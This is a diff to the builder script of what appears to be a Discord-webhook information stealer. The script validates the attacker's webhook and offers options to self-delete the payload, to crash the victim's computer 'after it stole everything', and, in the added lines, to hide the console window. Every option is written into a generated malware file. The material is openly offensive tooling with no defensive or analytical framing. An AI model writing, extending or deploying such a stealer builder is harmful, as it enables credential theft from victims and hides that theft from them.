@@ -29,7 +29,7 @@ while True:
             
             re = requests.get(Webhook)
             if re.status_code == 200 and ('discord.com' in Webhook or 'discordapp.com' in Webhook):
-                print('\033[92mValid Webhook\033[0m')
+                print('Valid Webhook')
                 break
             else:
                 print('Invalid Webhook')
@@ -44,6 +44,7 @@ while True:
     OneTime = get_boolean_input('Do you want to add the anti spammer (so he can launch only every 30 minutes) ? Y/N: ')
     melter = get_boolean_input('Do you enable melter (Delete the file after using it DONT WORK WITH CRASHER) ? Y/N: ')
     crasher = get_boolean_input('Do you want the program to make the computer crash after it stole everything ? Y/N: ')
+    hide = get_boolean_input('Do you want the program to make the console invicible ? Y/N: ')
 
     if melter == True:
         crasher = False
@@ -74,6 +75,7 @@ while True:
     new_content = new_content.replace("'%Onetime%'", str(OneTime))
     new_content = new_content.replace("'%Melter%'", str(melter))
     new_content = new_content.replace("'%Crash%'", str(crasher))
+    new_content = new_content.replace("'%Hide%'", str(hide))
     
     with open(f'./Build/temp.py', 'w', encoding='utf-8') as file:
         file.write(new_content)
